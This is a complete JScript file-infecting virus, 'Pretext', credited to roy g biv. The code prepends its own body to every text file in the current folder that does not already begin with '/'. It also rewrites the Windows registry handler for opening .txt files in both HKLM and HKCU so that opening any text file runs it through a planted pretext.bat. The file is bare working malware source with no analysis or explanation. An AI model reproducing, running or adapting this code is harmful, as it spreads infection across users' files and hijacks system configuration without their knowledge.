   //Pretext - roy g biv 24/06/02
   a=new ActiveXObject("scripting.filesystemobject");
   try{c=a.opentextfile(b=WScript.scriptfullname);d=c.read(944);e=a.getfile(b);f=c.read(e.size-944);c=e.attributes;e.attributes=0;
   a.opentextfile(b,2).write(f);e.attributes=c}catch(z){}for(c=new Enumerator(a.getfolder(".").files);!c.atEnd();c.moveNext()){
   e=c.item();if(b!=e&&a.getextensionname(e).toLowerCase()=="txt")try{f=a.opentextfile(e,1);g=f.read(1);if(g!="/")try{
   h=f.readall();i=e.attributes;e.attributes=0;j=a.opentextfile(e,2);j.write(d+g+h);j.close();e.attributes=i}catch(z){}
   f.close()}catch(z){}}b=new ActiveXObject("wscript.shell");c="HKLM";d="\\software\\classes\\txtfile\\shell\\open\\command\\";
   e=b.regread(c+d);f="pretext.bat";g=f+" %1";if(e!=g){h=a.getabsolutepathname(a.getspecialfolder(0));if(h.charAt(h.length-1)!="\\")h+="\\";
   a.opentextfile(h+f,2,1).write("@cscript %1 //e:jscript //b //nologo\r\n@"+e);b.regwrite(c+d,g);b.regwrite("HKCU"+d,g)}
